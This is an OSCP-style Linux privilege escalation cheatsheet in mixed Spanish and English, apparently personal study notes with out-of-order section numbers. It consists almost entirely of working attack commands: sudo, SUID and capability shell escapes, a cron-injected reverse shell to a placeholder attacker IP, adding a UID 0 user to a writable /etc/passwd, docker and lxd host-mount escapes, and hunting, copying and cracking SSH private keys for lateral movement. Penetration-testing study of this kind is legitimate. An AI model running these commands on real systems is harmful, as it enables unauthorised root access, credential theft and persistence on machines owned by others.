Linux Privilege Escalation Cheatsheet (OSCP Style)

1. Basic Enumeration (Always First)
id
whoami
groups
hostname
uname -a
uname -r
arch
cat /etc/issue
cat /etc/os-release
ps aux
env

Qué buscas:

  • Grupos interesantes (sudo, docker, lxd, adm)
  • Versión del kernel vulnerable
  • Servicios corriendo como root
  • Variables de entorno sensibles
2. SUDO Misconfiguration
sudo -l

Busca comandos ejecutables como root sin contraseña.

Ejemplos:

sudo find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/sh'
sudo less /etc/passwd
! /bin/sh

Consulta GTFOBins para abusar del binario permitido.

3. SUID Binaries
find / -perm -u=s -type f 2>/dev/null

Busca binarios con bit SUID.

Ejemplo:

find . -exec /bin/sh -p \; -quit

La flag -p mantiene EUID=root.

4. Capabilities
getcap -r / 2>/dev/null

Busca binarios con capabilities especiales.

Ejemplo peligroso:

/usr/bin/python = cap_setuid+ep
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
5. Cron Jobs
crontab -l
ls -lah /etc/cron*
cat /etc/crontab

Busca scripts ejecutados como root con permisos write.

echo "bash -i >& /dev/tcp/KALI_IP/4444 0>&1" >> script.sh
11. /etc/passwd Writable → Root Escalation

Concept

  • Linux passwords normally stored in /etc/shadow
  • If hash exists in /etc/passwd, it overrides shadow
  • If writable → we can inject a root user
  • UID 0 = root privileges

Step 1 – Check Permissions

ls -l /etc/passwd
If you see: 
-rw-rw-rw-
→ World writable = vulnerable

Step 2 – Generate Password Hash

openssl passwd w00t
Example output: 
Fdzt.eqJQ4s0g

Step 3 – Inject Root User

echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
Format reminder: 
username:hash:UID:GID:comment:home:shell
Critical fields:
  • UID = 0
  • GID = 0

Step 4 – Switch User

su root2
Password: w00t

id
Expected: 
uid=0(root) gid=0(root)

Quick Exploit Flow

ls -l /etc/passwd
openssl passwd newpass
echo "pwn:HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
su pwn
id

Why It Works

  • /etc/passwd hash overrides shadow
  • System trusts UID 0
  • No shadow access needed

OSCP Mental Trigger

If you see: 

WARNING: /etc/passwd world writable
→ Immediately think: Create UID 0 user
6. Writable Files & Misconfigured Permissions
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null
ls -la /etc/passwd

Si /etc/passwd es escribible:

openssl passwd newpass
echo 'root2:$1$hash:0:0:root:/root:/bin/bash' >> /etc/passwd

8. Docker / LXD Groups
id
groups

Si estás en docker:

docker run -v /:/mnt --rm -it alpine chroot /mnt sh

Si estás en lxd:

lxc init alpine privesc -c security.privileged=true
lxc config device add privesc root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh

10. Password Hunting
grep -Ri "password" /home 2>/dev/null
cat ~/.bash_history
cat /var/www/html/config.php
Buscar claves privadas: 
find / -name id_rsa 2>/dev/null

Using SSH Private Keys

If you find a private key (id_rsa, .pem, .key), follow this process:

1. Verify Key


cat /home/user/.ssh/id_rsa

Look for:

-----BEGIN OPENSSH PRIVATE KEY-----

2. Copy Key to Your Machine

Manual copy:


nano id_rsa

Paste key content and save.

3. Fix Permissions


chmod 600 id_rsa

Important: SSH will reject the key if permissions are too open.

4. Use the Key


ssh -i id_rsa user@target

5. If Passphrase is Required


ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

6. Post-Exploitation Checks

  • Try different users with the same key
  • Try key on other machines (lateral movement)
  • Check authorized_keys files

cat ~/.ssh/authorized_keys

OSCP Mental Trigger

If you see a private key → immediately think:


Copy → chmod 600 → ssh → crack if needed
